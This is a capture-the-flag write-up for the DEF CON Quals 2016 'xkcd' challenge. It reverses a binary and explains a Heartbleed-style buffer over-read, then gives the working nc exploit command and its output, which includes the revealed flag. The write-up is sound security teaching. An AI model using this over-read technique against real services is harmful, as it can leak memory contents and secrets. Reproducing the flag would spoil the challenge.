CTF: Defcon Quals 2016
Challenge: xkcd
Author: Benjamin Charron <bcharron@pobox.com>

This was one of the first challenges to open on quals weekend, and also the
easiest according to its value (in the low 20s).

Called XKCD. Hmmm. (Again, I missed the hint, wasting precious time. Was it always there?)

```
$ file xkcd
xkcd: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
```

It's not a very big program, and it's not stripped so it's pretty
straightforward to reverse. Here is the Hopper decompilation after setting the
prototype of "strcmp_sse3" to "int strcmp_sse3(char *a, char *b)" and
"__isoc99_sscanf" to "int __isoc99_sscanf(char *fmt, void *a, void *b)". (Not sure how to tell Hopper about va_arg.)


```c
int main(int arg0, int arg1) {
    _IO_setvbuf(_IO_2_1_stdout_, 0x0);
    _IO_setvbuf(_IO_2_1_stdin_, 0x0);
    bzero(0x6b7540, 0x100);
    flag_fd = fopen64("flag", "r");
    if (flag_fd != 0x0) goto loc_400fe7;

loc_400fd3:
    _IO_puts("Could not open the flag.");
    rax = 0xffffffff;
    return rax;

loc_400fe7:
    fread(flag_buf, 0x1, 256, flag_fd);
    goto loc_401002;

loc_401002:
    if (strcmp_ssse3(sign_extend_32(strtok(sign_extend_32(fgetln(_IO_2_1_stdin_, some_data)), "?")), "SERVER, ARE YOU STILL THERE") == 0x0) goto loc_401068;

loc_401054:
    _IO_puts("MALFORMED REQUEST");
    rax = exit(0xffffffff);
    return rax;

loc_401068:
    if (strcmp_ssse3(sign_extend_32(strtok(0x0, chr_double_quote)), " IF SO, REPLY ") == 0x0) goto loc_4010ab;

loc_401097:
    _IO_puts("MALFORMED REQUEST");
    rax = exit(0xffffffff);
    return rax;

loc_4010ab:
    chunk = sign_extend_32(strtok(0x0, chr_double_quote));
    rax = strlen(chunk);
    memcpy(user_input_buffer, chunk, rax);
    sign_extend_32(strtok(0x0, "("));
    __isoc99_sscanf(sign_extend_32(strtok(0x0, ")")), "%d LETTERS", number_of_letters);
    *(int8_t *)(sign_extend_32(number_of_letters) + 0x6b7340) = 0x0;
    if (sign_extend_64(number_of_letters) <= strlen(user_input_buffer)) goto loc_401168;

loc_401154:
    _IO_puts("NICE TRY");
    rax = exit(0xffffffff);
    return rax;

loc_401168:
    _IO_puts(user_input_buffer);
    goto loc_401002;
}
```

Basically, you send "SERVER, ARE YOU STILL THERE? IF SO, REPLY "%s" (%d
LETTERS)" and it will reply with that data.

I think one of the mods posted a hint in IRC or something because that's when I
noticed the XKCD reference URL on the challenge page. It was XKCD #1354
[https://xkcd.com/1354/], explaining Heartbleed.

Oh ok, so it's a play on heartbleed, which means we must trick the server into
revealing the flag. Cool :)

The user input is read on the stack, but the data between quotes is memcpy'd to
an address in .data. In fact, that address is conveniently located 512 before
the flag :)

So, I need to find a way to read about 512 characters from user_buf and
continue reading 40-50 from the flag buf. Obviously, I can't write write 1,000
characters since it would trash the flag before returning it.

In heartbleed, you could send less bytes than you asked for, but this program
is not so easily fooled:

```c
    if (sign_extend_64(number_of_letters) <= strlen(user_input_buffer)) {
	    _IO_puts(user_input_buffer);
    } else {
	    _IO_puts("NICE TRY");
	    rax = exit(-1);
    }
```

So if I send "aaaa" and ask for 1000 bytes, then 10000 > strlen("aaaa") and the
program exits. Bummer :(

What about negative numbers?  scanf() should gladly read "-1" as 0xffffffff..,
which would be smaller than strlen("aaaa") !

Unfortunately, the comparison is unsigned, preventing this exploit. In the code
below, notice how "jbe" is used after "cmp rbx, rax". JBE is unsigned, its
signed equivalent would have been JLE.

```
0000000000401145 BF40736B00                      mov        edi, user_input_buffer ; argument #1 for method strlen
000000000040114a E831610100                      call       strlen
000000000040114f 4839C3                          cmp        rbx, rax
0000000000401152 7614                            jbe        0x401168
```

puts() normally stops at the first NUL character, so the trick is now to get
puts() to continue reading past the end of the user input, giving us the flag. 

Fortunately for us, rather than validating the input length while reading, the
program does it *AFTER* the memcpy. If we fill the buffer with 512 non-null
bytes, then we trick puts() into reading after the user buffer and into the
flag buffer!

However, before sending the string back, the program writes a NUL character to
terminate the string, preventing this strategy from working. The trick is to
pass a number of letters which is greater than the number of bytes we are
sending. strlen() should count both the user input and the flag, allowing our
user-supplied nb_letters argument be a little longer than what we are sending.

We just have to guess the length of the flag, and request (512 + guess) bytes.

The result? A flag :)

I created a file "aa" filled with 512 times the letter "A". (for i in `seq
512`; do echo -n 'A' ; done > aa).

```bash
$ echo "SERVER, ARE YOU STILL THERE? IF SO, REPLY \"$(cat aa)\" (540 LETTERS)" | nc xkcd_be4bf26fcb93f9ab8aa193efaad31c3b.quals.shallweplayaga.me 1354																								
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThe flag is: bl33ding h34rt5
MALFORMED REQUEST																								
```
